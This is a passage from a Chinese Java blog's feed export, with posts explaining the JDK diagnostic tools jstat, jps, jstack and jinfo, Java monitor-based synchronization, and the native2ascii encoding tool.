所用的时间(单位秒)</td></tr><tr><td>–gcnewcapacity</td><td></td><td>监视内容与-gcnew基本相同，输出主要关注使用到的最大和最小空间.</td></tr><tr><td></td><td>NGCMN</td><td>新生代的最小容量大小（KB）</td></tr><tr><td></td><td>NGCMX</td><td>新生代的最大容量大小（KB）</td></tr><tr><td></td><td>NGC</td><td>当前新生代的容量大小（KB）</td></tr><tr><td></td><td>S0CMX</td><td>新生代中SO的最大容量大小（KB）</td></tr><tr><td></td><td>S0C</td><td>当前新生代中SO的容量大小（KB）</td></tr><tr><td></td><td>S1CMX</td><td>新生代中S1的最大容量大小（KB）</td></tr><tr><td></td><td>S1C</td><td>当前新生代中S1的容量大小（KB）</td></tr><tr><td></td><td>ECMX</td><td>新生代中Eden的最大容量大小（KB）</td></tr><tr><td></td><td>EC</td><td>当前新生代中Eden的容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td>–gcold</td><td></td><td>监视老年代及持久代GC的状况</td></tr><tr><td></td><td>PC</td><td>当前持久代容量的大小（KB）</td></tr><tr><td></td><td>PU</td><td>持久代使用容量的大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前老年代容量的大小（KB）</td></tr><tr><td></td><td>OU</td><td>老年代使用容量的大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gcoldcapacity</td><td></td><td>监视内容与——gcold基本相同，输出主要关注使用到的最大和最小空间</td></tr><tr><td></td><td>OGCMN</td><td>老生代的最小容量大小（KB）</td></tr><tr><td></td><td>OGCMX</td><td>老生代的最大容量大小（KB）</td></tr><tr><td></td><td>OGC</td><td>当前老生代的容量大小（KB）</td></tr><tr><td></td><td>OC</td><td>当前新生代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>-gcpermcapacity</td><td></td><td>输出永久代使用到的最大和最小空间</td></tr><tr><td></td><td>PGCMN</td><td>持久代的最小容量大小（KB）</td></tr><tr><td></td><td>PGCMX</td><td>持久代的最大容量大小（KB）</td></tr><tr><td></td><td>PGC</td><td>当前持久代的容量大小（KB）</td></tr><tr><td></td><td>PC</td><td>当前持久代的空间容量大小（KB）</td></tr><tr><td></td><td>YGC</td><td>从应用程序启动到采样时发生 Young GC 的次数</td></tr><tr><td></td><td>FGC</td><td>从应用程序启动到采样时发生 Full GC 的次数</td></tr><tr><td></td><td>FGCT</td><td>从应用程序启动到采样时 Full GC 所用的时间(单位秒)</td></tr><tr><td></td><td>GCT</td><td>从应用程序启动到采样时用于垃圾回收的总时间(单位秒)，它的值等于YGC+FGC</td></tr><tr><td>–printcompilation</td><td></td><td>输出已经被JIT编译的方法,HotSpot编译方法的统计</td></tr><tr><td></td><td>Compiled</td><td>编译任务执行的次数</td></tr><tr><td></td><td>Size</td><td>方法的字节码所占的字节数</td></tr><tr><td></td><td>Type</td><td>编译类型</td></tr><tr><td></td><td>Method</td><td>指定确定被编译方法的类名及方法名，类名中使名“/”而不是“.”做为命名分隔符，方法名是被指定的类中的方法，这两个字段的格式是由HotSpot中的“-XX:+PrintComplation”选项确定的。</td></tr></tbody></table><p><a href="http://blog.csdn.net/fenglibing/article/details/6411951">原文链接</a></p>]]></content>
    
    <summary type="html">
    
      jstat，监视虚拟机运行时状态信息。`jstat -gc 进程pid 2000 20`，查看进程新生代老年代的内存使用情况，年轻代老年代垃圾收集次数及时间,每隔2000ms输出pid的gc情况，一共输出20次。`jstat -gccause 进程pid`，查看进程垃圾收集原因。C即Capacity 总容量，U即Used 已使用的容量
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="jvm" scheme="https://blog.yanzhe.tk/tags/jvm/"/>
    
      <category term="jdk" scheme="https://blog.yanzhe.tk/tags/jdk/"/>
    
  </entry>
  
  <entry>
    <title>jdk命令jps jstack jinfo</title>
    <link href="https://blog.yanzhe.tk/2017/10/25/jdk-jps-jstack-jinfo/"/>
    <id>https://blog.yanzhe.tk/2017/10/25/jdk-jps-jstack-jinfo/</id>
    <published>2017-10-25T08:43:19.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDK开发组件简介"><a href="#JDK开发组件简介" class="headerlink" title="JDK开发组件简介"></a>JDK开发组件简介</h1><p>JDK包含了一批用于Java开发的组件，自JDK 1.5开始内置，其中包括：</p><ul><li>javac：编译器，将后缀名为.java的源代码编译成后缀名为“.class”的字节码</li><li>java：运行工具，运行.class的字节码</li><li>jar：打包工具，将相关的类文件打包成一个文件</li><li>javadoc：文档生成器，从源码注释中提取文档，注释需匹配规范</li><li>jdb debugger：调试工具</li><li>jps：显示当前java程序运行的进程状态</li><li>javap：反编译程序</li><li>appletviewer：运行和调试applet程序的工具，不需要使用浏览器</li><li>javah：从Java类生成C头文件和C源文件。这些文件提供了连接胶合，使Java和C代码可进行交互。[2]</li><li>javaws：运行JNLP程序</li><li>extcheck：一个检测jar包冲突的工具</li><li>apt：注释处理工具[3]</li><li>jhat：java堆分析工具</li><li>jstack：栈跟踪程序</li><li>jstat：JVM检测统计工具</li><li>jstatd：jstat守护进程</li><li>jinfo：获取正在运行或崩溃的java程序配置信息</li><li>jmap：获取java进程内存映射信息</li><li>idlj：IDL-to-Java编译器。将IDL语言转化为java文件[4]</li><li>policytool：一个GUI的策略文件创建和管理工具</li><li>jrunscript：命令行脚本运行<br>JDK中还包括完整的JRE（Java Runtime Environment），Java运行环境，也被称为private runtime。包括了用于产品环境的各种库类，如基础类库rt.jar，以及给开发人员使用的补充库，如国际化与本地化的类库、IDL库等等。<br>JDK中还包括各种样例程序，用以展示Java API中的各部分。</li></ul><h2 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h2><p>Java Virtual Machine Process Status Tool,显示指定系统内所有的HotSpot虚拟机进程。与unix上的ps类似，只不过jps是用来显示java进程，可以把jps理解为ps的一个子集。使用jps时，如果没有指定hostid，它只会显示本地环境中所有的Java进程；如果指定了hostid，它就会显示指定hostid上面的java进程，不过这需要远程服务上开启了<a href="http://blog.csdn.net/fenglibing/article/details/17323515">jstatd服务</a>.<br>jps仅查找当前用户的Java进程，而不是当前系统中的所有进程。</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>jdk中的jps命令可以显示当前运行的java进程以及相关参数，它的实现机制如下：<br>java程序在启动以后，会在java.io.tmpdir指定的目录下，就是临时文件夹里，生成一个类似于hsperfdata_User的文件夹，这个文件夹里（在Linux中为/tmp/hsperfdata_{userName}/），有几个文件，名字就是java进程的pid，因此列出当前运行的java进程，只是把这个目录里的文件名列一下而已。 至于系统的参数什么，就可以解析这几个文件获得。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hollis@hos:/tmp/hsperfdata_hollis$ pwd</span><br><span class="line">/tmp/hsperfdata_hollis</span><br><span class="line">hollis@hos:/tmp/hsperfdata_hollis$ ll</span><br><span class="line">total 48</span><br><span class="line">drwxr-xr-x 2 hollis hollis  4096  4月 16 10:54 ./</span><br><span class="line">drwxrwxrwt 7 root   root   12288  4月 16 10:56 ../</span><br><span class="line">-rw------- 1 hollis hollis 32768  4月 16 10:57 2679</span><br><span class="line">hollis@hos:/tmp/hsperfdata_hollis$</span><br></pre></td></tr></table></figure><p>上面的内容就是我机器中/tmp/hsperfdata_hollis目录下的内容，其中2679就是我机器上当前运行中的java的进程的pid，我们执行jps验证一下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">hollis@</span>hos:/tmp/hsperfdata_hollis$ jps</span><br><span class="line"><span class="number">2679</span> org.ec lipse.equinox.launcher_1<span class="number">.3</span><span class="number">.0</span>.v20130327<span class="number">-1440.</span>jar</span><br><span class="line"><span class="number">4445</span> Jps</span><br></pre></td></tr></table></figure><p>执行了jps命令之后，我们发现有两个java进程，一个是pid为2679的eclipse运行的进程，另外一个是pid为4445的jps使用的进程（他也是java命令，也要开一个进程）</p><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jps [options] [hostid]</code></p><h3 id="option参数"><a href="#option参数" class="headerlink" title="option参数"></a>option参数</h3><p>· -l : 输出主类全名或jar路径<br>· -q : 只输出LVMID,即忽略输出的类名、Jar名以及传递给main方法的参数，只输出pid<br>· -m : 输出JVM启动时传递给main()的参数，如果是内嵌的JVM则输出为null。<br>· -v : 输出JVM启动时显示指定的JVM参数<br>· -V : 输出通过标记的文件传递给JVM的参数（.hotspotrc文件，或者是通过参数-XX:Flags=<filename>指定的文件）。<br>· -J : 用于传递jvm选项到由javac调用的java加载器中，例如，“-J-Xms48m”将把启动内存设置为48M，使用-J选项可以非常方便的向基于Java的开发的底层虚拟机应用程序传递参数。</filename></p><h3 id="hostid"><a href="#hostid" class="headerlink" title="hostid"></a>hostid</h3><p>hostid指定了目标的服务器，它的语法如下：<br>[protocol:][[//]hostname][:port][/servername]<br>· protocol - 如果protocol及hostname都没有指定，那表示的是与当前环境相关的本地协议，如果指定了hostname却没有指定protocol，那么protocol的默认就是rmi。<br>· hostname - 服务器的IP或者名称，没有指定则表示本机。<br>· port - 远程rmi的端口，如果没有指定则默认为1099。<br>· Servername - 注册到RMI注册中心中的jstatd的名称。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> jps -lmv</span></span><br><span class="line">13352 sun.tools.jps.Jps -lmv -Dapplication.home=D:\Program Files\Java\jdk1.8.0_102 -Xms8m</span><br></pre></td></tr></table></figure><p><a href="http://blog.csdn.net/fenglibing/article/details/6411932">jps命令</a></p><h3 id="JPS失效处理"><a href="#JPS失效处理" class="headerlink" title="JPS失效处理"></a>JPS失效处理</h3><p>现象： 用ps -ef|grep java能看到启动的java进程，但是用jps查看却不存在该进程的id。待会儿解释过之后就能知道在该情况下，jconsole、jvisualvm可能无法监控该进程，其他java自带工具也可能无法使用</p><p>分析： jps、jconsole、jvisualvm等工具的数据来源就是这个文件（/tmp/hsperfdata_userName/pid)。所以当该文件不存在或是无法读取时就会出现jps无法查看该进程号，jconsole无法监控等问题</p><p>原因：</p><p>（1）、磁盘读写、目录权限问题 若该用户没有权限写/tmp目录或是磁盘已满，则无法创建/tmp/hsperfdata_userName/pid文件。或该文件已经生成，但用户没有读权限</p><p>（2）、临时文件丢失，被删除或是定期清理 对于linux机器，一般都会存在定时任务对临时文件夹进行清理，导致/tmp目录被清空。这也是我第一次碰到该现象的原因。常用的可能定时删除临时目录的工具为crontab、redhat的tmpwatch、ubuntu的tmpreaper等等</p><p>这个导致的现象可能会是这样，用jconsole监控进程，发现在某一时段后进程仍然存在，但是却没有监控信息了。</p><p>（3）、java进程信息文件存储地址被设置，不在/tmp目录下 上面我们在介绍时说默认会在/tmp/hsperfdata_userName目录保存进程信息，但由于以上1、2所述原因，可能导致该文件无法生成或是丢失，所以java启动时提供了参数(-Djava.io.tmpdir)，可以对这个文件的位置进行设置，而jps、jconsole都只会从/tmp目录读取，而无法从设置后的目录读物信息，这是我第二次碰到该现象的原因</p><p>附：</p><p>1.如何给main传递参数 在eclipse中，鼠标右键-&gt;Run As-&gt;Run COnfiguations-&gt;Arguments-&gt;在Program arguments中写下要传的参数值</p><p>1.如何给JVM传递参数 在eclipse中，鼠标右键-&gt;Run As-&gt;Run COnfiguations-&gt;Arguments-&gt;在VM arguments中写下要传的参数值（一般以-D开头）</p><p><a href="http://www.importnew.com/18132.html">Java命令学习系列（1）：Jps</a></p><h2 id="jstack-检查线程运行情况，是否有死锁"><a href="#jstack-检查线程运行情况，是否有死锁" class="headerlink" title="jstack (检查线程运行情况，是否有死锁)"></a>jstack (检查线程运行情况，是否有死锁)</h2><p>Java Stack Trace,用于生成给定的java进程ID或core file或远程调试服务的Java虚拟机当前时刻堆栈信息的线程快照。线程快照是当前java虚拟机内每一条线程正在执行的方法堆栈的集合，生成线程快照的主要目的是定位线程出现长时间停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等。 线程出现停顿的时候通过jstack来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做什么事情，或者等待什么资源。 如果是在64位机器上，需要指定选项”-J-d64”，Windows的jstack使用方式只支持以下的这种方式：<br><code>jstack [-l] pid</code><br>如果java程序崩溃生成core文件，jstack工具可以用来获得core文件的java stack和native stack的信息，从而可以轻松地知道java程序是如何崩溃和在程序何处发生问题。另外，jstack工具还可以附属到正在运行的java程序中，看到当时运行的java程序的java stack和native stack的信息, 如果现在运行的java程序呈现hung的状态(死锁)，jstack是非常有用的。</p><h3 id="命令格式-1"><a href="#命令格式-1" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jstack [ option ] pid</code><br><code>jstack [ option ] executable core</code><br><code>jstack [ option ] [server-id@]remote-hostname-or-IP</code></p><p>· executable Java executable from which the core dump was produced.<br>(可能是产生core dump的java可执行程序)<br>· core 将被打印信息的core dump文件<br>· remote-hostname-or-IP 远程debug服务的主机名或ip<br>· server-id 唯一id,假如一台主机上多个远程debug服务<br>· pid 需要被打印配置信息的java进程id,可以用jps查询.</p><h3 id="option参数-1"><a href="#option参数-1" class="headerlink" title="option参数"></a>option参数</h3><p>· -F to force a thread dump. Use when jstack<pid>does not respond (process is hung)当正常输出请求(jstack [-l]<pid>)不被响应时，强制输出线程堆栈<br>· -m 如果调用到本地方法的话，可以一并显示C/C++的堆栈<br>· -l 长列表. 除堆栈外，显示关于锁的附加信息.例如属于java.util.concurrent的ownable synchronizers列表.</pid></pid></p><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><p>当linux出现cpu被java程序消耗过高时，可使用以下步骤查找<br>1.top查找出哪个进程消耗的cpu高</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21125</span> co_ad2    <span class="number">18</span>   <span class="number">0</span> <span class="number">1817</span>m <span class="number">776</span>m <span class="number">9712</span> S  <span class="number">3.3</span>  <span class="number">4.9</span>  <span class="number">12</span>:<span class="number">03.24</span> java</span><br><span class="line"><span class="number">5284</span> co_ad     <span class="number">21</span>   <span class="number">0</span> <span class="number">3028</span>m <span class="number">2.5</span>g <span class="number">9432</span> S  <span class="number">1.0</span> <span class="number">16.3</span>   <span class="number">6629</span>:<span class="number">44</span> java</span><br><span class="line"><span class="number">21994</span> mysql     <span class="number">15</span>   <span class="number">0</span>  <span class="number">449</span>m  <span class="number">88</span>m <span class="number">5072</span> S  <span class="number">1.0</span>  <span class="number">0.6</span>  <span class="number">67582</span>:<span class="number">38</span> mysqld</span><br><span class="line"><span class="number">8657</span> co_sparr  <span class="number">19</span>   <span class="number">0</span> <span class="number">2678</span>m <span class="number">892</span>m <span class="number">9220</span> S  <span class="number">0.3</span>  <span class="number">5.7</span> <span class="number">103</span>:<span class="number">06.13</span> java</span><br></pre></td></tr></table></figure><p>这里我们分析21125这个java进程。</p><p>2.top中shift+h查找出哪个线程消耗的cpu高<br>先输入<code>top -p 21125</code>，然后再按shift+h。这里意思为只查看21125的进程，并且显示线程。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">21233</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">1.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">05.12</span> java</span><br><span class="line"><span class="number">20503</span> co_ad2_s  <span class="number">15</span>   <span class="number">0</span> <span class="number">1360</span>m <span class="number">560</span>m <span class="number">9176</span> S  <span class="number">0.3</span>  <span class="number">3.6</span>   <span class="number">0</span>:<span class="number">46.72</span> java</span><br><span class="line"><span class="number">21134</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">0.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">00.72</span> java</span><br><span class="line"><span class="number">22673</span> co_ad2    <span class="number">15</span>   <span class="number">0</span> <span class="number">1807</span>m <span class="number">630</span>m <span class="number">9492</span> S  <span class="number">0.3</span>  <span class="number">4.0</span>   <span class="number">0</span>:<span class="number">03.12</span> java</span><br></pre></td></tr></table></figure><p>这里我们分析21233这个线程，并且注意的是，这个线程是属于21125这个进程的。</p><p>3.jstack查找这个线程的信息<br>jstack [进程]|grep -A 10 [线程的16进制]<br>即：<br><code>jstack 21125|grep -A 10 52f1</code></p><p>-A 10表示查找到所在行的后10行。21233用计算器转换为16进制52f1，注意字母是小写。<br>结果：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"http-8081-11"</span> daemon prio=<span class="number">10</span> tid=<span class="number">0</span>x00002aab049a1800 nid=<span class="number">0</span>x52f1 <span class="keyword">in</span> Object.wait() [<span class="number">0</span>x0000000042c75000]</span><br><span class="line">   java<span class="selector-class">.lang</span><span class="selector-class">.Thread</span><span class="selector-class">.State</span>: WAITING (on <span class="selector-tag">object</span> monitor)</span><br><span class="line">     at java<span class="selector-class">.lang</span><span class="selector-class">.Object</span>.wait(Native Method)</span><br><span class="line">     at java<span class="selector-class">.lang</span><span class="selector-class">.Object</span>.wait(Object<span class="selector-class">.java</span>:<span class="number">485</span>)</span><br><span class="line">     at org<span class="selector-class">.apache</span><span class="selector-class">.tomcat</span><span class="selector-class">.util</span><span class="selector-class">.net</span>.JIoEndpoint<span class="variable">$Worker</span>.await(JIoEndpoint<span class="selector-class">.java</span>:<span class="number">416</span>)</span><br></pre></td></tr></table></figure><p>说不定可以一下子定位到出问题的代码。<br><a href="http://flysnowxf.iteye.com/blog/1162691">原文链接</a></p><p><a href="http://www.importnew.com/18176.html">其他死锁分析</a></p><h2 id="jinfo（Java7后不再使用）"><a href="#jinfo（Java7后不再使用）" class="headerlink" title="jinfo（Java7后不再使用）"></a>jinfo（Java7后不再使用）</h2><p>jinfo(JVM Configuration info)这个命令作用是实时查看和调整虚拟机运行参数。 之前的jps -v口令只能查看到显示指定的参数，如果想要查看未被显示指定的参数的值就要使用jinfo口令.<br>另外，Java7的官方文档指出，这一命令在后续的版本中不再使用。</p><h3 id="命令格式-2"><a href="#命令格式-2" class="headerlink" title="命令格式"></a>命令格式</h3><p><code>jinfo [option] [args] LVMID</code><br>或 <code>jinfo [option] &lt;executable &lt;core&gt;</code><br>或 <code>jinfo [option] [server_id@]&lt;remote server IP or hostname&gt;</code></p><h3 id="option参数-2"><a href="#option参数-2" class="headerlink" title="option参数"></a>option参数</h3><p>· -flag<name>输出指定JVM args参数的值<br>· -flag [+|-]<name>启用或禁用指定JVM args参数<br>· -flag<name>=<value>对指定JVM args参数设值<br>· -flags 不需要args参数，输出所有JVM参数的值<br>· -sysprops 输出系统属性，等同于System.getProperties()<br>·<no option>to print both of the above<br>· -h | -help to print this help message</no></value></name></name></name></p><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><p>查看<pid>2333的MaxPerm大小可以用<br><code>jinfo -flag MaxPermSize 2333</code></pid></p>]]></content>
    
    <summary type="html">
    
      jps，显示当前用户java程序运行的进程状态，`jps -lmv [pid]` 。jstack，检查线程运行情况，是否有死锁,`jstack [-l] pid`。jinfo，获取正在运行或崩溃的java程序配置信息，但Java7后不再使用，`jinfo -flag MaxPermSize pid`
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="jvm" scheme="https://blog.yanzhe.tk/tags/jvm/"/>
    
      <category term="jdk" scheme="https://blog.yanzhe.tk/tags/jdk/"/>
    
  </entry>
  
  <entry>
    <title>转:深入分析Java中基于监视器(Monitor)的同步(Synchronization)机制</title>
    <link href="https://blog.yanzhe.tk/2017/10/25/java-monitor-synchronization/"/>
    <id>https://blog.yanzhe.tk/2017/10/25/java-monitor-synchronization/</id>
    <published>2017-10-25T02:31:18.000Z</published>
    <updated>2020-08-23T01:48:10.243Z</updated>
    
    <content type="html"><![CDATA[<p>如果读者在大学期间学习过操作系统相关课程，并且没有在课堂上睡着的话。那么可能知道，监视器(monitor)是操作系统中用于实现同步(synchronization)机制非常重要的基础数据结构。幸运的是，Java中对于同步(synchronization)机制的实现，同样是基于监视器。本文将使用类比的方式来讲述Java中同步(synchronization)机制的基础：监视器(monitor)。</p><a id="more"></a><h2 id="监视器-Monitor-概述"><a href="#监视器-Monitor-概述" class="headerlink" title="监视器(Monitor)概述"></a>监视器(Monitor)概述</h2><p>一个监视器可以被类比成一栋房子(Building)，该房子里面包含了一个特殊的房间(Special Room)。这个特殊的房间在某一个时刻只可以被一个客户(线程)占领。通常来说，这个房间里会包含一些数据和代码。</p><p><img data-src="Monitor.jpg" alt="Monitor"></p><p>正如上图所示，在该栋房子中，一共会有三个房间。如果一个客户(线程)想要占领这个特殊的房间，它必须首先进入到 Hallway(Entry Set) 中进行等待。调度程序(Scheduler)将会基于某种策略(比如，FIFO),从Hallway中选择某一个客户。如果这个客户(线程)因为某些事件或原因被挂起了，该客户进离开 特殊房间 而进入 等待房间(Wait Room)，以后，调度程序可能会重新选择它，把它从 等待房间 放入到 特殊房间中。</p><p>简而言之，一个监视器就是用于监控与调度多个线程如何进入特殊房间的基础设备。它可以确保只有一个客户(线程)可以访问受保护的数据或代码。</p><h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2><p>在Java虚拟机(JVM)中，每一个对象(Object)和每一个类(Class)都在逻辑上与某一个监视器(monitor)关联在一起。为了实现所有的这些监视器(monitors)之间的相互排斥能力，每一个对象(Object)和每一个类(Class)都具有一个锁(lock, 也称互斥锁(mutex))。在正统的操作系统中，这种情形又称为一个信号(semaphore)，互斥锁就是一个二元信号。</p><p><img data-src="semaphore.jpg" alt="semaphore"></p><p>如果一个线性获得了某些数据上的一个锁(lock)，那么，直到该线程释放该锁之前，其他的线程都无法获取该锁。如果我们在进行多线程编程时，每次都需要获取信号、操作信号、释放信号等操作，那么多线程的编程体验将是非常不愉快的。幸运的是，我们并不需要这么做，JVM在底层帮我们把这些繁琐的细节做完了。</p><p>为了声明一个监控区域，该监控区域最多只允许一个客户(线程)访问，Java提供了 同步语句(synchronization statements) 和 同步方法(synchronization methods) 两种便利机制。一旦某个代码块被 synchronized 关键词包围，该代码块就变成了一个监控区域。同时，该监控区域对应的二元信号，由JVM在底层自动生成并维护着。</p><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>我们知道，每一个对象(Object)或者类(Class)都有一个关联的监视器。换言之，我们可以直接说，每一个对象都有一个一个监视器，因为类(Class)在广义上也是一个JVM中的对象。因为每个对象都有它私自的空间，而且可以监控它的客户(线程)序列。</p><p>为了不同的线程之间可以互相协作，Java提供了 wait() 、notify() 等方法来 挂起一个线程、唤醒另一个等待在特定监视器上的线程。此外，Java还提供了另外三个版本的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wait(<span class="keyword">long</span> timeout, <span class="keyword">int</span> nanos)</span><br><span class="line">wait(<span class="keyword">long</span> timeout) notified by other threads or notified by timeout.</span><br><span class="line">notify(all)</span><br></pre></td></tr></table></figure><p>注意：这些线程之间的协作方法，只可以在同步方法 (synchronized methods) 或者 同步声明(synchronized statements) 中被调用。原因很简单，如果一个客户(线程)不需要信号的互斥，那么就没有必须让该客户与其他客户进行监视或者合作，该客户可以直接随意的访问该方法。</p><p>个人的理解：同步(synchronized)控制的是线程是否有权限访问，wait()/notify()控制的是线程之间的访问顺序，所以必须先有同步(权限)控制，在内部再进行顺序控制。</p><p><a href="http://www.tiantianbianma.com/java-monitor-synchronization.html/">原文链接</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;如果读者在大学期间学习过操作系统相关课程，并且没有在课堂上睡着的话。那么可能知道，监视器(monitor)是操作系统中用于实现同步(synchronization)机制非常重要的基础数据结构。幸运的是，Java中对于同步(synchronization)机制的实现，同样是基于监视器。本文将使用类比的方式来讲述Java中同步(synchronization)机制的基础：监视器(monitor)。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/categories/java/"/>
    
    
      <category term="Java" scheme="https://blog.yanzhe.tk/tags/java/"/>
    
      <category term="Synchronization" scheme="https://blog.yanzhe.tk/tags/synchronization/"/>
    
      <category term="线程" scheme="https://blog.yanzhe.tk/tags/%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>jdk自带转码工具native2ascii</title>
    <link href="https://blog.yanzhe.tk/2017/10/24/jdk-native2ascii/"/>
    <id>https://blog.yanzhe.tk/2017/10/24/jdk-native2ascii/</id>
    <published>2017-10-24T07:05:03.000Z</published>
    <updated>2020-08-23T01:48:10.247Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在做Java开发的时候，常常会出现一些乱码，或者无法正确识别或读取的文件，比如常见的validator验证用的消息资源（properties）文 件就需要进行Unicode重新编码。原因是java默认的编码方式为Unicode，而计算机系统编码常常是GBK等编码。需要将系统的编码转换 为java正确识别的编码问题就解决了。</p><p>##语法格式:</p><p>native2ascii -[options] [intputfile] [outputfile]</p><p>语法格式说明:</p><p>-[options]：表示命令开关，有两个选项可供选择</p><p>　　-reverse：将Unicode编码转为本地或者指定编码，不指定编码情况下，将转为本地编码。</p><p>　　-encoding encoding_name：转换为指定编码，encoding_name为编码名称。</p><p>　　 [inputfile [outputfile]]</p><p>　　 inputfile：表示输入文件全名。</p><p>　　 outputfile：输出文件名。如果缺少此参数，将输出到控制台。</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>native2ascii 工具将带有本机编码字符（非拉丁 1 和非单一码字符）的文件转换成带有Unicode编码字符的文件。 假设需要转化的属性文件为：D:\src\resources.properties（含有中文字符） ，转化后的属性文件为：D:\classes\resources.properties（中文字符统一转化为Unicode） 那么使用如下命令<br><code>JAVA_HOME\bin\native2ascii -encoding GBK D:\src\resources.properties D:\classes\resources.properties</code></p><h3 id="控制台转换字符"><a href="#控制台转换字符" class="headerlink" title="控制台转换字符"></a>控制台转换字符</h3><p>在控制台中可以输入汉字回车后，就可以看到转移后的字符了。<br>Ctrl+C退出。</p><h3 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h3><p><code>native2ascii allMessages_zh_CN.input.properties allMessages_zh_CN.properties</code><br>将文件allMessages_zh_CN.input.properties编码后输出为allMessages_zh_CN.properties。<br>为了方便properties文件的管理，建议纯中文的配置文件用input命名。</p><h3 id="反向单一"><a href="#反向单一" class="headerlink" title="反向单一"></a>反向单一</h3><p><code>native2ascii -reverse allMessages_zh_CN.properties allMessages_zh_CN.txt</code>注意-reverse参数</p><p>批量反向<br>JDK自带的工具native2ascii可以将uncode编码的文件转换为本地编码的文件，但是不能批量转换文件。</p><h2 id="用法介绍"><a href="#用法介绍" class="headerlink" title="用法介绍"></a>用法介绍</h2><p>如果应用系统是面向多种语言的，编程时就不得不设法解决国际化问题，包括操作界面的风格问题、提示和帮助语言的版本问题、界面定制个性化问题等。　由于Java语言具有平台无关、可移植性好等优点，并且提供了强大的类库，所以Java语言可以辅助我们解决上述问题。Java语言本身采用双字节字符编码，采用大汉字字符集，这就为解决国际化问题提供了很多方便。从设计角度来说，只要把程序中与语言和文化有关的部分分离出来，加上特殊处理，就可以部分解决国际化问题。在界面风格的定制方面，我们把可以参数化的元素，如字体、颜色等，存储在数据库里，以便为用户提供友好的界面；如果某些部分包含无法参数化的元素，那么我们可能不得不分别设计，通过有针对性的编码来解决具体问题。</p><h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>首先将JDK的bin目录加入系统变量path。在盘下建立一个test目录，在test目录里建立一个zh.txt文件，文件内容为：“熔岩”，打开“命令行提示符”，并进入C:\test目录下。下面就可以按照说明一步一步来操作，注意观察其中编码的变化。</p><h3 